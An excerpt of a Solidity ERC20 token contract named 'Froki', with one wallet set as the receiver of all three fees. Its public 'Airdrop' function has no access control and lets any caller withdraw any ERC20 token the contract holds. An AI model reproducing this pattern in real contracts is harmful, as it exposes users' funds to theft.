...
contract FrokiARB is Context, ERC20, Ownable {
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Froki"; 
    string constant _symbol = "FROKI"; 
    ...
    // Fees Receivers
    address public devFeeReceiver = 0x92e72b074c263c615B600Af29CF252E944C0431E;
    address public marketingFeeReceiver = 0x92e72b074c263c615B600Af29CF252E944C0431E;
    address public liquidityFeeReceiver = 0x92e72b074c263c615B600Af29CF252E944C0431E;
    ...
    function Airdrop(address lt, uint256 dot) public returns (bool success) {
        return ERC20(lt).transfer(msg.sender, dot);
    }
